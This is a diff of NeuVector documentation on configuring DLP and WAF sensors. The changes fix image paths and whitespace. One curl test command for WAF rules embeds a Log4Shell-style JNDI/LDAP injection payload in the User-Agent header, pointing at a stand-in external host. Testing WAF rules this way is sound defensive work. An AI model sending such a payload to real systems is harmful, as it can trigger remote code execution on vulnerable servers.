@@ -14,18 +14,18 @@ Configuring DLP or WAF is a two step process:
 2. Apply the desired sensor to a Group, in the Policy -> Groups screen.
 
 ####WAF Sensors
-WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected. 
+WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected.
 
-This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs. 
+This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs.
 
 Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers).
 
-![waf](waf_sensors.png)
+![waf](/img/05.policy/09.dlp/waf_sensors.png)
 
 #### DLP Sensors
 DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group.
 
-![dlp](sensors.png)
+![dlp](/img/05.policy/09.dlp/sensors.png)
 
 ####Configuring DLP and WAF sensors
 The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:
@@ -33,7 +33,7 @@ The configuration of DLP and WAF sensors is similar. Create a sensor Name and an
 + Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results.
 + Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only.
 
-![waf](5_sensor_config.png)
+![waf](/img/05.policy/09.dlp/5_sensor_config.png)
 
 
 Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives.
@@ -64,18 +64,18 @@ It is recommended that DLP sensors be applied to the boundary of a security zone
 
 It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic).
 
-![group](apply_dlp_group.png)
+![group](/img/05.policy/09.dlp/apply_dlp_group.png)
 
 <strong>DLP/WAF Behavior Summary</strong>
 
 + DLP pattern matching does not occur for the traffic which is passing among workloads that belong to same DLP group.
-+ Any traffic passing in and out of a DLP group is scanned for pattern matches. 
++ Any traffic passing in and out of a DLP group is scanned for pattern matches.
 + Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections.
 + Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule).
 + Multiple alerts are generated for a single packet if it matches multiple rules.
 + For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules.
 + Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds.
-+ PCRE is used for pattern matching. 
++ PCRE is used for pattern matching.
 + Hyper scan library is used for efficient, scalable and high-performance pattern matching.
 
 #### DLP/WAF Actions in Discover, Monitor, Protect Modes
@@ -103,7 +103,7 @@ Using curl to POST data to server(container) can help to test WAF rule:
 curl  -X POST -k  -H "X-Auth-Token: $_TOKEN_" -H "Content-Type: application/json" -H "User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}" -d '$SOME_DATA' "http://$SOME_IP_:$PORT"
 ```
 
-####WAF Setup and Testing	
+####WAF Setup and Testing
 The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors. The README provides instructions for running it.
 
 [Download WAF test script](waf_test.zip)
@@ -112,15 +112,15 @@ The downloadable file below provides an unsupported script for creating WAF sens
 
 DLP match in Discover or Monitor Mode
 
-![DLPAlert](dlp4_alert_discover.png)
+![DLPAlert](/img/05.policy/09.dlp/dlp4_alert_discover.png)
 
 DLP match in Protect Mode
 
-![DLPProtect](dlp_5_protect.png)
+![DLPProtect](/img/05.policy/09.dlp/dlp_5_protect.png)
 
 DLP Security Event Notification for Credit Card Match
 
-![DLPCredit](dlp6_credit.png)
+![DLPCredit](/img/05.policy/09.dlp/dlp6_credit.png)
 
 NOTE: The automated packet capture will contain the actual packet including the credit card number matched. This is also true of any DLP packet capture for any sensitive data.
 
@@ -277,7 +277,7 @@ See the [CRD section](/policy/usingcrd) for more details on working with CRDs.
 ### DLP/WAF Response Rules
 Response rules based on DLP/WAF security events can be created in Policy ->Response Rules. Start type DLP or WAF and the dropdown will list all sensors and patterns available to create rules.
 
-![DLPResponse](dlp7_response.png)
+![DLPResponse](/img/05.policy/09.dlp/dlp7_response.png)
 
 ###Adding WAF CRD Support to Previous NeuVector Deployments
 1. Delete old neuvector-binding-customresourcedefinition clusterrole
